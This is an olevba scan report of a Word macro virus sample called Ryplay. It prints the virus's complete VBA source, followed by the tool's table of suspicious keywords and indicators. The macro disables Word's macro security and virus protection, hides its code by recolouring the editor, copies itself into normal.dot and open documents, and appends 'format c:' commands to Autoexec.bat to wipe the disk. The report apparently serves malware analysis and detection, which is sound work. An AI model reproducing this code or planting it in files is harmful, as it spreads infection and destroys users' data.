olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ryplay-236d5446a38e56a7c106779681e6c8da2d7d5ed2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO RYPLEY.cls 
in file: Virus.MSWord.Ryplay-236d5446a38e56a7c106779681e6c8da2d7d5ed2 - OLE stream: 'Macros/VBA/RYPLEY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































































Private Sub Document_Close()
On Error Resume Next: Dim CAR As Boolean: Randomize
Set S = System: Set O = Options: Set L = Selection: Set F = Selection.Font
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\6.0\Common", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 "
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\6.0\Common", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 "
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 "
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 "
S.PrivateProfileString("", "HKEY_CURRENT_USER\Software\RYPLEY\CAR\", "RYPLEY") = "EL MEJOR DE LOS CINCO CONTINENTES"
O.VirusProtection = False: O.ConfirmConversions = False: O.SavePropertiesPrompt = False: O.SaveNormalPrompt = False
O.OptimizeForWord97byDefault = True: ActiveDocument.OptimizeForWord97 = True
If GetAttr(NormalTemplate.Path & "\normal.dot") And vbReadOnly Then
CAR = False
If CAR = False Then SetAttr NormalTemplate.Path & "\normal.dot", vbNormal
If CAR = False Then Application.Quit
Else
GoTo RYPLEY
End If
RYPLEY:
Set A = ActiveDocument.VBProject.VBComponents.Item(1): Set N = NormalTemplate.VBProject.VBComponents.Item(1)
Set AC = A.CodeModule: Set NC = N.CodeModule
Open "c:\CAR.scf" For Output As #1
Print #1, VBProject.VBComponents.Item(1).CodeModule.Lines(1, VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Close #1
If A.Name <> "RYPLEY" Then
AC.DeleteLines 1, AC.CountOfLines
AC.AddFromFile ("c:\CAR.scf")
End If
If N.Name <> "RYPLEY" Then
NC.DeleteLines 1, NC.CountOfLines
NC.AddFromFile ("c:\CAR.scf")
End If
A.Name = "RYPLEY": N.Name = "RYPLEY"
If Minute(Now) = Second(Now) Then
Open "C:\Autoexec.bat" For Append As #1
Print #1, ""
Print #1, "@echo s|format c: /q/c/v:RYPLEY >RYPLEY"
Print #1, "@echo y|format c: /q/c/v:RYPLEY >RYPLEY"
Print #1, "@echo o|format c: /q/c/v:RYPLEY >RYPLEY"
Print #1, "@echo t|format c: /q/c/v:RYPLEY >RYPLEY"
Close #1
End If
If Int(Rnd() * 10) < 1 Then
L.WholeStory: L.Delete Unit:=wdCharacter, Count:=1: F.Name = "Times New Roman":
L.ParagraphFormat.Alignment = wdAlignParagraphCenter: F.Bold = wdToggle: F.Size = 50
L.TypeText Text:="RYPLEY": L.TypeParagraph: F.Bold = wdToggle: F.Size = 20:
L.TypeText Text:="EL MEJOR DE LOS CINCO CONTINENTES"
End If
ActiveDocument.BuiltInDocumentProperties(wdPropertyCompany) = "IMPUNIX ©"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Kill "c:\CAR.scf"
'IMPUNIX © presenta su Virus: RYPLEY
'Creado por tHEmASTER & $$Y & XBIT & K@NSERVERO
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |CAR.scf             |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

